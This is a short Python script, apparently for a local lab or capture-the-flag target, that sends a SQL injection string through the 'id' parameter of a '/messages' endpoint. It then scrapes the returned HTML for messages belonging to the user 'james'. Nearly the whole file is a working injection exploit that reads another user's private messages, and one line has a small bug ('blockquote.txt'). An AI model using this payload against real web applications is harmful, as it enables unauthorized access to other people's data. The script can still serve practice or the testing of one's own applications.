import requests
from bs4 import BeautifulSoup

# Set url and html response
target_ip = 'http://0.0.0.0:5001'
target_category = '/messages'
url = target_ip + target_category
injection = "abc123' or mail='james@bond.mi5"

payload = {'id': injection}
response = requests.get(url, params=payload)

# Set up Soup for HTML parsing
soup = BeautifulSoup(response.text, "html.parser")

# Create a filter and iterate through all div classes
for div in soup.findAll('div', {'class': 'p-2 m-2 card'}):
    # look up for a message written by 'james'
    if 'james' in div.text:
        print(div.text)

        # look up for div of type 'blockquote'
        for blockquote in div.find_all('blockquote'):
            print(blockquote.txt)
